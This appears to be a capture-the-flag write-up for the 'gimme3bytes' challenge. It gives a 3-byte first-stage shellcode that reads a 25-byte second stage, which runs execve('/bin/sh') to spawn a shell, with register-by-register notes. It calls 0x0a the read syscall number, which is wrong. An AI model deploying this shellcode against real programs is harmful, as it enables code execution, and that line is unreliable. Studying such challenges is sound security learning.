# gimme3bytes

It reads 3 bytes from stdin and executes them as shellcode.

The idea is to run a multi-stage shellcode, where the first stage is a small shellcode that call the syscall `read` to read the second stage from stdin. The second stage is the actual shellcode that will be executed.

## First Stage (3 bytes)

```c
pop rdx
syscall
```

- RAX: already set to 0x0a (syscall number for `read`)
- RDI: already set to 0x0 (stdin)
- RSI: already set to the buffer address
- RDX: set using `pop rdx`. Why so? Because at that point the stack contains a large number that can be used as a buffer size

## Second Stage (25 bytes)

Main idea: `execve(RDI -> "/bin/sh", RSI = argv -> NULL, RDX = envp -> NULL)`

```c
nop
nop
nop
mov rdi, rsi
add rdi, 0x19
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
```

Note: The first three `nop`s are there since the RIP after the first stage is set at the end of the buffer and cannot be changed. With the three `nop`s we push the second stage three bytes forward right where the RIP will be set and then `mov rdi, rsi` will be the first instruction executed.

- RDI: set to the buffer address + 25, to point to the string "/bin/sh"
- RAX: set to 0x3b (syscall number for `execve`)
- RSI: set to 0x0 (NULL)
- RDX: set to 0x0 (NULL)

The complete exploit is in [script.py](script.py).
